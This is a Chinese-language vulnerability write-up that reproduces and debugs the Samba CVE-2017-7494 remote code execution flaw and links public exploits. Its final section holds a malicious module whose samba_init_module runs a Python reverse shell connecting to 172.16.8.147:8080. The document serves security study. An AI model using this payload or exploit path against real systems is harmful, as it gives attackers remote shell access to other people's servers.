# cve-2017-7494 Samba远程代码执行分析
## 1、背景
看到群里小伙伴都在讨论这个漏洞，我也就尝试复现分析一下

## 2、复现
漏洞影响的是Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本，在github上下载了4.6.2版本，手工编译，运行 sudo  ./bin/smbd -i。

两个exp 地址 
1. https://github.com/omri9741/cve-2017-7494
2. https://www.exploit-db.com/exploits/42060/

经测试都能成功利用

![](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/10.png)

## 3、exp分析

一开始看360博客，关于这个漏洞的利用过程有点懵，又看了看exploit-db漏洞利用的exp，还是没看懂
不过回过头来感觉还是要从exp入手
exp里面，作者重写了_retrieveFileFromOffset_SMB1Unix 这个方法
```
def hook_retrieveFile(self):
    self._retrieveFileFromOffset = self._retrieveFileFromOffset_SMB1Unix
```
看来关键就是这个函数改了什么
和原码对比之后就少了一句
```
path = path.replace('/', '\\')
```
不过也正好对应了360博客里面的利用过程：构造一个有’/’ 符号的管道名或路径名
光这么看感觉还不明朗，尝试动态调试

## 4、动态分析
gdb 附加smbd 进程
来到触发漏洞等函数

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/2.png)

进入函数，来到关键的判断

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/3.png)

加载输入等模块

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/4.png)

找到samba_init_module

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/5.png)

返回并执行

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/7.png)



这是这个漏洞触发的过程
如果改回之前的代码，看看会发生什么

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/8.png)

‘\’ 被替换，也就无法利用

![image](https://github.com/xcainiao/exploit/tree/master/paper/cve-2017-7494%20Samba远程代码执行分析/img/9.png)

## 5、漏洞利用
反弹shell的某个方法，用system执行个python 

```
int samba_init_module(void)
{
        system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.16.8.147\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'");
        return 0;
}
```
## 6、参考
http://blogs.360.cn/blog/samba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2017-7494%E5%88%86%E6%9E%90/
